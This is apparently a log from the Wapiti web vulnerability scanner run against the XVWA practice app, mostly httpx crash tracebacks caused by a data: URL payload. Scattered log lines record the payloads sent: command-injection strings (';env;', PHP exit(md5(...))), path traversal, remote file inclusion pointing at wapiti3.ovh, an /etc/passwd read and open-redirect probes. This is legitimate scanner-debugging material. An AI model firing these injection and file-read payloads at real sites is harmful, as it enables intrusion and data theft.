+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x7cf1942d8c20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x7cf18fa38990>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x7cf1942d8b80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x7cf1942da980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x7cf194438e00>
+    └ <Handle <TaskStepMethWrapper object at 0x7cf18f0d8d00>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x7cf18f0d8d00>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x7cf18f0d8d00>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x7cf18f0d8d00>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x7cf1942dc390 [unset]>
+          │   └ <function Wapiti.attack at 0x7cf18f70e520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x7cf18fabae90>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x7cf18f4d3210>
+          │             │      └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+          │             └ <function ModuleExec.attack at 0x7cf18f35fa60>
+          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x7cf18fa239d0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_exec.py", line 101, in attack
+    response: Response = await self.crawler.async_send(mutated_request)
+    │                          │    │       │          └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%...
+    │                          │    │       └ <function AsyncCrawler.async_send at 0x7cf19313a020>
+    │                          │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7cf18f69d990>
+    │                          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x7cf18fa239d0>
+    └ <wapitiCore.net.response.Response object at 0x7cf18f3c4750>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%...
+                     │    └ <function AsyncCrawler.async_get at 0x7cf19313a160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7cf18f69d990>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x7cf18f69d990>, GET http://web/xvwa/vulnerabilities/redirect/redirect.php?fo...
+                  └ <function AsyncCrawler.async_get at 0x7cf19313a0c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x7cf1936a11c0>
+                     │    └ <httpx.AsyncClient object at 0x7cf18faba3d0>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7cf18f69d990>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x7cf1936a1260>
+                     └ <httpx.AsyncClient object at 0x7cf18faba3d0>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x7cf1936a1300>
+                     └ <httpx.AsyncClient object at 0x7cf18faba3d0>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJyw...
+              │    └ <function BaseClient._build_redirect_request at 0x7cf193693c40>
+              └ <httpx.AsyncClient object at 0x7cf18faba3d0>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJyw...
+          │    └ <function BaseClient._redirect_url at 0x7cf193693d80>
+          └ <httpx.AsyncClient object at 0x7cf18faba3d0>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x7cf193da5ee0>
+          │   │              │       └ URL('http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA...
+          │   │              └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJyw...
+          │   └ <function URL.copy_with at 0x7cf193db18a0>
+          └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x7cf193db0400>
+    │                     │   └ ParseResult(scheme='data', userinfo='', host='', port=None, path=';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', quer...
+    │                     └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'data', 'authority': '', 'path': ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', 'query': None, 'fragment'...
+           └ <function urlparse at 0x7cf193db0220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg=='
+    └ <function validate_path at 0x7cf193db0a40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-20 15:28:24.857 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-20 15:28:24.946 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report 7e1d4178-e6ce-11ee-8e48-0242ac160004 ... SUCCESS
+2024-03-20 15:28:24.949 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 15:28:25.038 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 15:28:25.061 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//redirect.json/
+2024-03-20 15:28:25.062 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//redirect.json/web_03202024_1528.html with a browser to see this report.
+2024-03-20 15:28:35.516 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:35.644 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 15:28:35.644 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_3e7b1455.db
+2024-03-20 15:28:35.648 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
+2024-03-20 15:28:35.679 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 15:28:35.679 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 15:28:35.685 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 15:28:35.790 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 15:28:35.790 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 15:28:35.803 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:35.803 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 15:28:35.875 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-20 15:28:35.875 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/xvwa/vulnerabilities/redirect/redirect.php via injection in the query string
+2024-03-20 15:28:35.875 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-20 15:28:35.875 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /xvwa/vulnerabilities/redirect/redirect.php?forward=https%3A%2F%2Fopenbugbounty.org%2F HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+2024-03-20 15:28:35.875 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-20 15:28:35.876 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2F%2Fopenbugbounty.org%2F
+2024-03-20 15:28:35.937 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-20 15:28:35.937 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/xvwa/vulnerabilities/redirect/redirect.php via injection in the query string
+2024-03-20 15:28:35.938 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-20 15:28:35.938 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /xvwa/vulnerabilities/redirect/redirect.php?forward=%2F%2Fopenbugbounty.org%2F HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+2024-03-20 15:28:35.938 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-20 15:28:35.953 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 15:28:35.967 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:35.971 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%3Benv%3B (0)
+2024-03-20 15:28:35.979 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%7Cenv%7C (0)
+2024-03-20 15:28:35.987 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=a%3Benv%3B (0)
+2024-03-20 15:28:35.994 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=a%3Benv%3B (0)
+2024-03-20 15:28:36.003 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-20 15:28:36.011 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%3Benv%3B (0)
+2024-03-20 15:28:36.020 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%0Aenv%3B (0)
+2024-03-20 15:28:36.028 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%26set%26 (0)
+2024-03-20 15:28:36.036 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=set (0)
+2024-03-20 15:28:36.044 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=env (0)
+2024-03-20 15:28:36.052 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2Fe%00 (0)
+2024-03-20 15:28:36.060 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:36.067 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:36.076 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:36.084 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:36.093 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:36.100 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:36.108 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:36.116 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:36.125 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:36.133 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:36.141 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:36.148 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:36.156 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-20 15:28:36.163 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x70619eed8900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x70619eed8860>
+    │       └ <function run at 0x7061a3a67560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x70619ef87240>
+           │      └ <function Runner.run at 0x7061a38f6fc0>
+           └ <asyncio.runners.Runner object at 0x7061a391f190>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x7061a38f4c20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x7061a391f190>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x7061a38f4b80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x7061a38f6980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x7061a3a54e00>
+    └ <Handle <TaskStepMethWrapper object at 0x70619e02c190>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x70619e02c190>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x70619e02c190>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x70619e02c190>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x70619ef34390 [unset]>
+          │   └ <function Wapiti.attack at 0x70619eee2520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x70619f042210>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x70619e15a7d0>
+          │             │      └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+          │             └ <function ModuleExec.attack at 0x70619ed3e840>
+          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x70619eca39d0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_exec.py", line 101, in attack
+    response: Response = await self.crawler.async_send(mutated_request)
+    │                          │    │       │          └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%...
+    │                          │    │       └ <function AsyncCrawler.async_send at 0x7061a2742020>
+    │                          │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x70619ec9ea10>
+    │                          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x70619eca39d0>
+    └ <wapitiCore.net.response.Response object at 0x70619e02b950>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%...
+                     │    └ <function AsyncCrawler.async_get at 0x7061a2742160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x70619ec9ea10>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x70619ec9ea10>, GET http://web/xvwa/vulnerabilities/redirect/redirect.php?fo...
+                  └ <function AsyncCrawler.async_get at 0x7061a27420c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x7061a2cb91c0>
+                     │    └ <httpx.AsyncClient object at 0x70619ef0e550>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x70619ec9ea10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x7061a2cb9260>
+                     └ <httpx.AsyncClient object at 0x70619ef0e550>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x7061a2cb9300>
+                     └ <httpx.AsyncClient object at 0x70619ef0e550>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJyw...
+              │    └ <function BaseClient._build_redirect_request at 0x7061a2cabc40>
+              └ <httpx.AsyncClient object at 0x70619ef0e550>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJyw...
+          │    └ <function BaseClient._redirect_url at 0x7061a2cabd80>
+          └ <httpx.AsyncClient object at 0x70619ef0e550>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x7061a33be110>
+          │   │              │       └ URL('http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA...
+          │   │              └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJyw...
+          │   └ <function URL.copy_with at 0x7061a33c98a0>
+          └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x7061a33c8400>
+    │                     │   └ ParseResult(scheme='data', userinfo='', host='', port=None, path=';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', quer...
+    │                     └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'data', 'authority': '', 'path': ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', 'query': None, 'fragment'...
+           └ <function urlparse at 0x7061a33c8220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg=='
+    └ <function validate_path at 0x7061a33c8a40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-20 15:28:36.227 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-20 15:28:36.302 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report 84e44ea2-e6ce-11ee-94ea-0242ac160004 ... SUCCESS
+2024-03-20 15:28:36.307 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 15:28:36.321 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:36.327 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-20 15:28:36.337 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
+2024-03-20 15:28:36.344 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2Fetc%2Fpasswd (0)
